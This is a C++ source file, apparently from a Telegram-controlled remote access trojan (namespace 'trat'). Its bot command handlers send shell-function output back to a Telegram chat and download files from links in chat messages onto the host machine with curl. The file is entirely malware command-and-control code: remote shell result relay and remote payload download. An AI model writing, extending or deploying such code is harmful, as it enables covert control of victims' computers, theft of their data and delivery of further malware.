#include "../../include/bot.hpp"

namespace trat
{
    void Bot::handleTextBasedCommand(const char* Telegram_Message_Text, const char* Command,  char* Shell_Function_Callback_Result)
    {
        if (strstr(Telegram_Message_Text, Command))
        {
            std::thread([this, Shell_Function_Callback_Result]() 
            {
                this->sendMessage(Shell_Function_Callback_Result);
            }).detach();
        }

    }
    void Bot::handleDownloadCommand(const char* Telegram_Message_Text)
    {
        if (auto link = extractDownloadLink(Telegram_Message_Text))
        {
            std::thread([this, link = std::move(link)]() 
            {
                auto networking_response = trat::curlDownload(link, constructFilePath(link));
                char message_buffer[256];
                if (networking_response.isSuccessful)
                {
                    snprintf(message_buffer, sizeof(message_buffer), "Download completed in %f",  networking_response.timeInSeconds);   
                }
                else
                {
                    snprintf(message_buffer, sizeof(message_buffer), "DownloadFailed: %s",  networking_response.errorLog);
                }
                this->sendMessage(message_buffer);
            }).detach();
    }
}
}